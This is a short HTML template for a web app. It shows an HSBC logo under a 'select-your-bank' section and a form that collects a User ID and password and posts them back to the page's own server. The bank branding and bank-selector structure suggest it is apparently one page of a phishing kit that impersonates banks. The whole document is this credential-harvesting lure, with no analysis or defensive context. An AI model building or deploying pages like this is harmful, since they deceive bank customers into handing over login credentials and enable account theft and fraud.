{%extends 'base.html'%}
{%block body%}
<body style="background-color: rgb(255, 164, 164);">
    <div class="container">
        <section name='header'>
            <div class="select-your-bank">
                <img src="/static/images/hsbc.png" width='95%' alt="">
            </div>
        </section>

        <div class="form">
            <form action="" method="POST">
                <div class="form-group">
                    <input name="user-id" style="height: 50px;" type="text" class="form-control" placeholder="User ID">
                </div>

                <div class="form-group">
                    <input name="password" style="height: 50px;" type="password" class="form-control" placeholder="Password">
                </div>

                <input style="width: 100%; background-color: red; color: white;" class="btn btn-lg" value="Submit" type="submit">
            </form>
        </div>
    </div>
</body>
{%endblock%}
